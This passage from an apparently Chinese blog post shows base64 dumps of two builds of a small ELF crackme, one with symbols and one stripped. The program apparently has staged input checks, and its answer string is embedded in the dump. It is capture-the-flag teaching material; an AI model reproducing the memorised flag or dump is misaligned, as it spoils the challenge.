class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwEUAAAAAA</span><br><span class="line">AIARQAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAAABBAAAAAAAANAAAAAAAAADgWQAAAAAAA</span><br><span class="line">GQAAAAAAAAAQPkAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAABg+QAAAAAAAHAAAAAAAAAAI</span><br><span class="line">AAAAAAAAAPX+/28AAAAAoANAAAAAAAAFAAAAAAAAAIAEQAAAAAAABgAAAAAAAADAA0AAAAAAAAoA</span><br><span class="line">AAAAAAAAgAAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAEBA</span><br><span class="line">AAAAAAACAAAAAAAAAHgAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAgAVAAAAAAAAHAAAA</span><br><span class="line">AAAAAFAFQAAAAAAACAAAAAAAAAAwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAABAFQAAA</span><br><span class="line">AAAA////bwAAAAABAAAAAAAAAPD//28AAAAAAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAID5AAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">MBBAAAAAAABAEEAAAAAAAFAQQAAAAAAAYBBAAAAAAABwEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAZmxhZ3s5ODRiYmEyNy1hZjI2LTQ0MDgtODIxZC0xMzgzNWMyZTgzNTl9</span><br><span class="line">AEdDQzogKFVidW50dSA5LjQuMC0xdWJ1bnR1MX4yMC4wNC4yKSA5LjQuMAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAADAAEAGANAAAAAAAAAAAAAAAAAAAAAAAADAAIAOANAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAADAAMAWANAAAAAAAAAAAAAAAAAAAAAAAADAAQAfANAAAAAAAAAAAAAAAAAAAAAAAAD</span><br><span class="line">AAUAoANAAAAAAAAAAAAAAAAAAAAAAAADAAYAwANAAAAAAAAAAAAAAAAAAAAAAAADAAcAgARAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAADAAgAAAVAAAAAAAAAAAAAAAAAAAAAAAADAAkAEAVAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAADAAoAUAVAAAAAAAAAAAAAAAAAAAAAAAADAAsAgAVAAAAAAAAAAAAAAAAAAAAAAAADAAwA</span><br><span class="line">ABBAAAAAAAAAAAAAAAAAAAAAAAADAA0AIBBAAAAAAAAAAAAAAAAAAAAAAAADAA4AgBBAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAADAA8A0BBAAAAAAAAAAAAAAAAAAAAAAAADABAAOBZAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAADABEAACBAAAAAAAAAAAAAAAAAAAAAAAADABIAjCBAAAAAAAAAAAAAAAAAAAAAAAADABMA+CBA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAADABQAED5AAAAAAAAAAAAAAAAAAAAAAAADABUAGD5AAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAADABYAID5AAAAAAAAAAAAAAAAAAAAAAAADABcA8D9AAAAAAAAAAAAAAAAAAAAAAAAD</span><br><span class="line">ABgAAEBAAAAAAAAAAAAAAAAAAAAAAAADABkAQEBAAAAAAAAAAAAAAAAAAAAAAAADABoAi0BAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAADABsAAAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAwAAAACAA8AEBFAAAAAAAAAAAAAAAAAAA4AAAACAA8AQBFAAAAAAAAAAAAAAAAAACEAAAACAA8A</span><br><span class="line">gBFAAAAAAAAAAAAAAAAAADcAAAABABoAi0BAAAAAAAABAAAAAAAAAEYAAAABABUAGD5AAAAAAAAA</span><br><span class="line">AAAAAAAAAG0AAAACAA8AsBFAAAAAAAAAAAAAAAAAAHkAAAABABQAED5AAAAAAAAAAAAAAAAAAJgA</span><br><span class="line">AAAEAPH/AAAAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAJ8AAAABABMAlCJA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAK0AAAAAABQAGD5AAAAAAAAAAAAA</span><br><span class="line">AAAAAL4AAAABABYAID5AAAAAAAAAAAAAAAAAAMcAAAAAABQAED5AAAAAAAAAAAAAAAAAANoAAAAA</span><br><span class="line">ABIAjCBAAAAAAAAAAAAAAAAAAO0AAAABABgAAEBAAAAAAAAAAAAAAAAAAAMBAAASAA8AMBZAAAAA</span><br><span class="line">AAAFAAAAAAAAABMBAAASAAAAAAAAAAAAAAAAAAAAAAAAAJkBAAAgABkAQEBAAAAAAAAAAAAAAAAA</span><br><span class="line">ACgBAAASAAAAAAAAAAAAAAAAAAAAAAAAADoBAAAQABkAi0BAAAAAAAAAAAAAAAAAAA0BAAASAhAA</span><br><span class="line">OBZAAAAAAAAAAAAAAAAAAEEBAAASAA8AfRJAAAAAAACuAAAAAAAAAEgBAAASAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAGQBAAASAAAAAAAAAAAAAAAAAAAAAAAAAHgBAAASAAAAAAAAAAAAAAAAAAAAAAAAAJcB</span><br><span class="line">AAAQABkAQEBAAAAAAAAAAAAAAAAAAKQBAAASAA8AKxNAAAAAAADvAQAAAAAAAKsBAAAgAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAALoBAAARAhkASEBAAAAAAAAAAAAAAAAAAMcBAAARABEAACBAAAAAAAAEAAAA</span><br><span class="line">AAAAANYBAAASAA8AwBVAAAAAAABlAAAAAAAAAOYBAAARABkAYEBAAAAAAAArAAAAAAAAALkAAAAQ</span><br><span class="line">ABoAkEBAAAAAAAAAAAAAAAAAAOwBAAASAg8AABFAAAAAAAAFAAAAAAAAAJ0BAAASAA8A0BBAAAAA</span><br><span class="line">AAAvAAAAAAAAAAQCAAAQABoAi0BAAAAAAAAAAAAAAAAAABACAAASAA8AhRVAAAAAAAA3AAAAAAAA</span><br><span class="line">ABUCAAASAA8AHxJAAAAAAABeAAAAAAAAABwCAAASAA8AthFAAAAAAABpAAAAAAAAACICAAASAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAADwCAAARAhkAkEBAAAAAAAAAAAAAAAAAAEgCAAASAA8AGhVAAAAAAABr</span><br><span class="line">AAAAAAAAAOABAAASAgwAABBAAAAAAAAAAAAAAAAAAABjcnRzdHVmZi5jAGRlcmVnaXN0ZXJfdG1f</span><br><span class="line">Y2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuODA2MQBfX2RvX2dsb2JhbF9k</span><br><span class="line">dG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRf</span><br><span class="line">YXJyYXlfZW50cnkAZGVtby5jAF9fRlJBTUVfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlOQU1J</span><br><span class="line">QwBfX2luaXRfYXJyYXlfc3RhcnQAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VUX1RB</span><br><span class="line">QkxFXwBfX2xpYmNfY3N1X2ZpbmkAc3RybmNtcEBAR0xJQkNfMi4yLjUAcHV0c0BAR0xJQkNfMi4y</span><br><span class="line">LjUAX2VkYXRhAHN0YWdlMgBfX3N0YWNrX2Noa19mYWlsQEBHTElCQ18yLjQAcHJpbnRmQEBHTElC</span><br><span class="line">Q18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4yLjUAX19kYXRhX3N0YXJ0AHN0YWdl</span><br><span class="line">MwBfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX19saWJjX2NzdV9p</span><br><span class="line">bml0AGZsYWcxAF9kbF9yZWxvY2F0ZV9zdGF0aWNfcGllAF9fYnNzX3N0YXJ0AG1haW4Ac3RhZ2Ux</span><br><span class="line">AGNoZWNrAF9faXNvYzk5X3NjYW5mQEBHTElCQ18yLjcAX19UTUNfRU5EX18Ac3RhZ2U0AAAuc3lt</span><br><span class="line">dGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3RlLmdu</span><br><span class="line">dS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52</span><br><span class="line">ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5zZWMA</span><br><span class="line">LnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAu</span><br><span class="line">ZmluaV9hcnJheQAuZHluYW1pYwAuZ290AC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAGwAAAAEAAAACAAAAAAAAABgDQAAAAAAAGAMAAAAAAAAcAAAAAAAAAAAAAAAAAAAAAQAA</span><br><span class="line">AAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAAA4A0AAAAAAADgDAAAAAAAAIAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAgAAAAAAAAAAAAAAAAAAAA2AAAABwAAAAIAAAAAAAAAWANAAAAAAABYAwAAAAAAACQAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAASQAAAAcAAAACAAAAAAAAAHwDQAAAAAAAfAMAAAAA</span><br><span class="line">AAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAFcAAAD2//9vAgAAAAAAAACgA0AAAAAA</span><br><span class="line">AKADAAAAAAAAHAAAAAAAAAAGAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABhAAAACwAAAAIAAAAAAAAA</span><br><span class="line">wANAAAAAAADAAwAAAAAAAMAAAAAAAAAABwAAAAEAAAAIAAAAAAAAABgAAAAAAAAAaQAAAAMAAAAC</span><br><span class="line">AAAAAAAAAIAEQAAAAAAAgAQAAAAAAACAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAHEA</span><br><span class="line">AAD///9vAgAAAAAAAAAABUAAAAAAAAAFAAAAAAAAEAAAAAAAAAAGAAAAAAAAAAIAAAAAAAAAAgAA</span><br><span class="line">AAAAAAB+AAAA/v//bwIAAAAAAAAAEAVAAAAAAAAQBQAAAAAAAEAAAAAAAAAABwAAAAEAAAAIAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAjQAAAAQAAAACAAAAAAAAAFAFQAAAAAAAUAUAAAAAAAAwAAAAAAAAAAYAAAAA</span><br><span class="line">AAAACAAAAAAAAAAYAAAAAAAAAJcAAAAEAAAAQgAAAAAAAACABUAAAAAAAIAFAAAAAAAAeAAAAAAA</span><br><span class="line">AAAGAAAAGAAAAAgAAAAAAAAAGAAAAAAAAAChAAAAAQAAAAYAAAAAAAAAABBAAAAAAAAAEAAAAAAA</span><br><span class="line">ABsAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAnAAAAAEAAAAGAAAAAAAAACAQQAAAAAAA</span><br><span class="line">IBAAAAAAAABgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAKcAAAABAAAABgAAAAAAAACA</span><br><span class="line">EEAAAAAAAIAQAAAAAAAAUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACwAAAAAQAAAAYA</span><br><span class="line">AAAAAAAA0BBAAAAAAADQEAAAAAAAAGUFAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAtgAA</span><br><span class="line">AAEAAAAGAAAAAAAAADgWQAAAAAAAOBYAAAAAAAANAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAA</span><br><span class="line">AAAAALwAAAABAAAAAgAAAAAAAAAAIEAAAAAAAAAgAAAAAAAAigAAAAAAAAAAAAAAAAAAAAQAAAAA</span><br><span class="line">AAAAAAAAAAAAAADEAAAAAQAAAAIAAAAAAAAAjCBAAAAAAACMIAAAAAAAAGwAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAEAAAAAAAAAAAAAAAAAAAA0gAAAAEAAAACAAAAAAAAAPggQAAAAAAA+CAAAAAAAACgAQAAAAAA</span><br><span class="line">AAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAANwAAAAOAAAAAwAAAAAAAAAQPkAAAAAAABAuAAAAAAAA</span><br><span class="line">CAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADoAAAADwAAAAMAAAAAAAAAGD5AAAAAAAAY</span><br><span class="line">LgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA9AAAAAYAAAADAAAAAAAAACA+</span><br><span class="line">QAAAAAAAIC4AAAAAAADQAQAAAAAAAAcAAAAAAAAACAAAAAAAAAAQAAAAAAAAAP0AAAABAAAAAwAA</span><br><span class="line">AAAAAADwP0AAAAAAAPAvAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAACAQAA</span><br><span class="line">AQAAAAMAAAAAAAAAAEBAAAAAAAAAMAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAA</span><br><span class="line">AAAACwEAAAEAAAADAAAAAAAAAEBAQAAAAAAAQDAAAAAAAABLAAAAAAAAAAAAAAAAAAAAIAAAAAAA</span><br><span class="line">AAAAAAAAAAAAABEBAAAIAAAAAwAAAAAAAACLQEAAAAAAAIswAAAAAAAABQAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAEAAAAAAAAAAAAAAAAAAAAWAQAAAQAAADAAAAAAAAAAAAAAAAAAAACLMAAAAAAAACsAAAAAAAAA</span><br><span class="line">AAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAuDAAAAAAAADY</span><br><span class="line">BgAAAAAAAB0AAAAtAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJA3</span><br><span class="line">AAAAAAAATwIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAADfOQAAAAAAAB8BAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

</details>

<p>去除符号表版本：</p>
<details class="note info"><summary><p><code>demo_nosym.out</code></p>
</summary>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA0BBAAAAAAABAAAAAAAAAAMgxAAAAAAAAAAAAAEAAOAAN</span><br><span class="line">AEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA</span><br><span class="line">AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDQAAAAAAAGANAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA</span><br><span class="line">AAAAAAABAAAABAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAPgFAAAAAAAA+AUAAAAAAAAAEAAA</span><br><span class="line">AAAAAAEAAAAFAAAAABAAAAAAAAAAEEAAAAAAAAAQQAAAAAAARQYAAAAAAABFBgAAAAAAAAAQAAAA</span><br><span class="line">AAAAAQAAAAQAAAAAIAAAAAAAAAAgQAAAAAAAACBAAAAAAACYAgAAAAAAAJgCAAAAAAAAABAAAAAA</span><br><span class="line">AAABAAAABgAAABAuAAAAAAAAED5AAAAAAAAQPkAAAAAAAHsCAAAAAAAAgAIAAAAAAAAAEAAAAAAA</span><br><span class="line">AAIAAAAGAAAAIC4AAAAAAAAgPkAAAAAAACA+QAAAAAAA0AEAAAAAAADQAQAAAAAAAAgAAAAAAAAA</span><br><span class="line">BAAAAAQAAAA4AwAAAAAAADgDQAAAAAAAOANAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE</span><br><span class="line">AAAABAAAAFgDAAAAAAAAWANAAAAAAABYA0AAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPl</span><br><span class="line">dGQEAAAAOAMAAAAAAAA4A0AAAAAAADgDQAAAAAAAIAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAUOV0</span><br><span class="line">ZAQAAACMIAAAAAAAAIwgQAAAAAAAjCBAAAAAAABsAAAAAAAAAGwAAAAAAAAABAAAAAAAAABR5XRk</span><br><span class="line">BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE</span><br><span class="line">AAAAEC4AAAAAAAAQPkAAAAAAABA+QAAAAAAA8AEAAAAAAADwAQAAAAAAAAEAAAAAAAAAL2xpYjY0</span><br><span class="line">L2xkLWxpbnV4LXg4Ni02NC5zby4yAAAAAAAEAAAAEAAAAAUAAABHTlUAAgAAwAQAAAADAAAAAAAA</span><br><span class="line">AAQAAAAUAAAAAwAAAEdOVQAZtmifBt/IJsB7cH3WFlFieqoD1AQAAAAQAAAAAQAAAEdOVQAAAAAA</span><br><span class="line">AwAAAAIAAAAAAAAAAAAAAAEAAAABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAACwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAIgAAABIAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAJwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAOAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAPwAA</span><br><span class="line">ABIAAAAAAAAAAAAAAAAAAAAAAAAAcQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAEwAAABIAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAGxpYmMuc28uNgBzdHJuY21wAF9faXNvYzk5X3NjYW5mAHB1dHMAX19zdGFj</span><br><span class="line">a19jaGtfZmFpbABwcmludGYAX19saWJjX3N0YXJ0X21haW4AR0xJQkNfMi43AEdMSUJDXzIuNABH</span><br><span class="line">TElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwAAAAIAAgADAAIAAgAAAAQAAQADAAEAAAAQAAAAAAAA</span><br><span class="line">ABdpaQ0AAAQAUQAAABAAAAAUaWkNAAADAFsAAAAQAAAAdRppCQAAAgBlAAAAAAAAAPA/QAAAAAAA</span><br><span class="line">BgAAAAUAAAAAAAAAAAAAAPg/QAAAAAAABgAAAAYAAAAAAAAAAAAAABhAQAAAAAAABwAAAAEAAAAA</span><br><span class="line">AAAAAAAAACBAQAAAAAAABwAAAAIAAAAAAAAAAAAAAChAQAAAAAAABwAAAAMAAAAAAAAAAAAAADBA</span><br><span class="line">QAAAAAAABwAAAAQAAAAAAAAAAAAAADhAQAAAAAAABwAAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span 